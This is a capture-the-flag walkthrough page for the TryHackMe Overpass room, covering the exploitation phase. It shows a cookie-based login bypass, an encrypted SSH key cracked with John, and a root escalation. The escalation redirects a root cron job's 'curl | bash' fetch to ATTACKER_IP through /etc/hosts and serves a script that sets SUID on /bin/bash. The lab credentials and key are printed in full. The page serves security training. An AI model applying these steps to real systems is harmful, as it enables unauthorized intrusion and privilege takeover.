---
sidebar_position: 2
title: Exploitation
description: Overpass
keywords: [overpass, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, john, privilege escalation]
---


## JavaScript

The Login <b style={{ color: 'SandyBrown' }}>[IP:80/admin]</b> is Handled by <b style={{ color: 'DarkGrey' }}>JavaScript.</b> The code sends the Credentials to the Endpoint and sets the Response to the <span style={{fontWeight: 'Bold'}}>Cookie</span> called: `SessionToken`.  We can Simply set the `SessionToken` to a Random Value to gain Access.



```bash
# We can Set the Token with CURL, from the Browser or Cookie Editor Browser Extensions 
curl "10.10.240.124/admin/" -b "SessionToken=400"
``` 


```js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        // highlight-start
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
        // highlight-end
    }
}
```

<br/>

- After Setting the **Cookie Value** we get Presented with a Page showing us the **Private SSH Key.**
- **Found Username in the Message:** <b style={{ color: 'Chartreuse' }}>james</b>

```log
Welcome to the Overpass Administrator area
A secure password manager with support for Windows, Linux, MacOS and more
    
Since you keep forgetting your password, James, I've set up SSH keys for you.
If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

<br/>

## JOHN

- The **`Private SSH Key`** is Password Protected we can use `John` to Brute Force it.
- **Password:** <b style={{ color: 'Chartreuse' }}>james</b><b style={{ color: 'Dark' }}>:</b><b style={{ color: 'Coral' }}>james13</b>

```
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
james13          (id_rsa)
```

<br/>

---
## Privilege Escalation

- **Using `SSH` Credentials to Login:** <b style={{ color: 'Chartreuse' }}>james</b><b style={{ color: 'Dark' }}>:</b><b style={{ color: 'Coral' }}>james13</b>

```bash
james@overpass-prod:~$ id
uid=1001(james) gid=1001(james) groups=1001(james)
```

<br/>

- The **User** <b style={{ color: 'Red' }}>ROOT</b> is using <span style={{fontWeight: 'Bold'}}>curl</span> on <span style={{fontWeight: 'Bold'}}>overpass.thm/downloads/src/buildscript.sh</span> and piping the Contents of the <span style={{fontWeight: 'Bold'}}>Script</span> into `BASH`

```bash
james@overpass-prod:~$ cat /etc/crontab 
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

<br/>

- The User `james` has **WRITE Permissions** on `/etc/hosts`
- We modify the **`overpass.thm`** Address to our Machine Address.

```log
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
// highlight-next-line
ATTACKER_IP overpass.thm  
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

<br/>

- After modifying  `/etc/hosts` we can **Host** the same file `[buildscript.sh]` the User <b style={{ color: 'Red' }}>ROOT</b> is trying to `curl`
- Our `[buildscript.sh]` sets the <b style={{ color: 'Red' }}>SUID</b> Bit on `/bin/bash` Binary.

```bash
#!/bin/bash
chmod u+s /bin/bash
```

```bash
james@overpass-prod:~$ ls -l /bin/bash 
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
james@overpass-prod:~$ /bin/bash -p
root@overpass-prod:~$ id
uid=1001(james) gid=1001(james) euid=0(root) egid=0(root) groups=0(root),1001(james)
root@overpass-prod:~$ whoami
root
```

---

<br/>

## OTHER


- In the Home Directory of the User <b style={{ color: 'Chartreuse' }}>james</b> there is a <span style={{fontWeight: 'Bold'}}>Hidden File</span> `.overpass`
- <span style={{fontWeight: 'Bold'}}>File Contents:</span>

```bash
# ROT47
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN. -->> [{"name":"System","pass":"saydrawnlyingpicture"}] 
```